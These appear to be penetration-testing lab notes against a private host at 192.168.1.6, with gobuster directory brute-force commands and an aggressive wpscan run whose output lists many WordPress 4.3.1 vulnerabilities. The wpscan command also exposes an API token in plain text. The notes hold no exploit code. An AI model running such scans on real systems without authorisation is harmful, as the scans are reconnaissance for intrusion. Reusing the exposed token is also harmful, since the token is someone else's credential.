

![[Pasted image 20261017144645.png]]


![[Pasted image 20261017144850.png]]


![[Pasted image 20261017144944.png]]


![[Pasted image 20261017145111.png]]


```
gobuster dir -u http://192.168.1.6 -w /usr/share/wordlists/dirb/common.txt 
 

```

![[Pasted image 20261017150700.png]]

```
gobuster dir -u http://192.168.1.6 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 100 --no-error

```




![[Pasted image 20261017153902.png]]


![[Pasted image 20261017151349.png]]



```
wpscan --url https://192.168.1.6   --disable-tls-checks --enumerate u,ap,at,cb,dbe --plugins-detection aggressive --random-user-agent --force  --api-token zXsYCxt6Utqb68HVzi2KwtJc32a8aDBlBqeFKTdbvyY
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.1.6/ [192.168.1.6]
[+] Started: Sat Oct 17 05:03:27 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://192.168.1.6/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.1.6/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: https://192.168.1.6/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - https://192.168.1.6/146c789.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - https://192.168.1.6/146c789.html, Match: 'WordPress 4.3.1'
 |
 | [!] 115 vulnerabilities identified:
 |
 | [!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/09329e59-1871-4eb7-b6ea-fd187cd8db23
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
 |      - https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
 |
 | [!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
 |     Fixed in: 4.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/b19b6a22-3ebf-488d-b394-b578cd23c959
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36435
 |      - https://hackerone.com/reports/110801
 |
 | [!] Title: WordPress 3.7-4.4.1 - Open Redirect
 |     Fixed in: 4.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/8fba3ea1-553c-4426-ad00-03cc258bff3f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36444
 |
 | [!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/0810e7fe-7212-49ae-8dd1-75260130b7f5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
 |
 | [!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/238b69c9-4d56-4820-b09f-e778f108faf7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
 |
 | [!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/c0775703-ed52-4b6b-b395-7bf440ee0d77
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
 |      - https://codex.wordpress.org/Version_4.5
 |
 | [!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 4.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/60556c39-6fe7-4b69-a614-16202ba588ad
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
 |      - https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
 |
 | [!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
 |     Fixed in: 4.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
 |      - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
 |
 | [!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/a4395fa3-a2ba-4aac-b195-679112dd2828
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
 |
 | [!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/12a47b8e-83e8-47b1-9713-cdd690b069e5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
 |      - https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
 |
 | [!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/897d068a-d3c1-4193-bc55-f65225265967
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
 |
 | [!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
 |     Fixed in: 4.3.6
 |     References:
 |      - https://wpscan.com/vulnerability/e84eaf3f-677a-465a-8f96-ea4cf074c980
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
 |      - https://seclists.org/fulldisclosure/2016/Sep/6
 |
 | [!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
 |     Fixed in: 4.3.6
 |     References:
 |      - https://wpscan.com/vulnerability/7dcebd34-1a38-4f61-a116-bf8bf977b169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
 |
 | [!] Title: WordPress 4.3-4.7 - Remote Code Execution (RCE) in PHPMailer
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/146d60de-b03c-48c6-9b8b-344100f5c3d6
 |      - https://www.wordfence.com/blog/2016/12/phpmailer-vulnerability/
 |      - https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/24767c76d359231642b0ab48437b64e8c6c7f491
 |      - http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_phpmailer_host_header/
 |
 | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/8b098363-1efb-4831-9b53-bb5d9770e8b4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
 |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/6737b4a2-080c-454a-a16e-7fc59824c659
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
 |      - https://www.mehmetince.net/low-severity-wordpress/
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
 |
 | [!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/0a666ddd-a13d-48c2-85c2-bfdc9cd2a5fb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
 |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/e080c934-6a98-4726-8e7a-43a718d05e79
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
 |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/3e355742-6069-4d5d-9676-613df46e8c54
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
 |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/c448e613-6714-4ad7-864f-77659b4da893
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
 |
 | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/481e3398-ed2e-460a-af67-ff58027901d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
 |
 | [!] Title: WordPress 4.3.0-4.7.1 - Cross-Site Scripting (XSS) in posts list table
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/e99e456e-375a-4475-8070-229bc0e30c65
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5612
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/4482f9207027de8f36630737ae085110896ea849
 |
 | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/2c5632d8-4d40-4099-9e8f-23afde51b56e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
 |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
 |      - https://seclists.org/oss-sec/2017/q1/563
 |
 | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/d40374cf-ee95-40b7-9dd5-dbb160b877b1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
 |
 | [!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
 |      - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 |
 | [!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/003d94a5-a075-47e5-a69e-eeaf9b7a3269
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
 |      - https://seclists.org/oss-sec/2017/q1/562
 |      - https://hackerone.com/reports/153093
 |
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpscan.com/vulnerability/b3f2f3db-75e4-4d48-ae5e-d4ff172bc093
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239
 |
 | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/e9e59e08-0586-4332-a394-efb648c7cd84
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
 |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/973c55ed-e120-46a1-8dbb-538b54d03892
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/a5a4f4ca-19e5-4665-b501-5c75e0f56001
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/efe46d58-45e4-4cd6-94b3-1a639865ba5b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
 |
 | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/78ae4791-2703-4fdd-89b2-76c674994acf
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
 |      - https://hackerone.com/reports/203515
 |      - https://hackerone.com/reports/203515
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/e9535a5c-c6dc-4742-be40-1b94a718d3f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
 |
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/9b3414c0-b33b-4c55-adff-718ff4c3195d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
 |     Fixed in: 4.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/95e87ae5-eb01-4e27-96d3-b1f013deff1c
 |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://wpvulndb.com/vulnerabilities/8905
 |
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/571beae9-d92d-4f9b-aa9f-7c94e33683a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/d74ee25a-d845-46b5-afa6-b0a917b7737a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457
 |      - https://hackerone.com/reports/205481
 |
 | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/e525b3ed-866e-4c48-8715-19fc8be14939
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41395
 |      - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
 |
 | [!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
 |     Fixed in: 4.3.13
 |     References:
 |      - https://wpscan.com/vulnerability/c161f0f0-6527-4ba4-a43d-36c644e250fc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
 |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
 |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
 |      - https://twitter.com/ircmaxell/status/923662170092638208
 |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
 |
 | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
 |
 | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/1f71a775-e87e-47e9-9642-bf4bce99c332
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
 |
 | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/a6281b30-c272-4d44-9420-2ebd3c8ff7da
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
 |
 | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
 |     Fixed in: 4.3.14
 |     References:
 |      - https://wpscan.com/vulnerability/809f68d5-97aa-44e5-b181-cc7bdf5685c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
 |
 | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.15
 |     References:
 |      - https://wpscan.com/vulnerability/6ac45244-9f09-4e9c-92f3-f339d450fe72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/42720
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.3.16
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.3.17
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
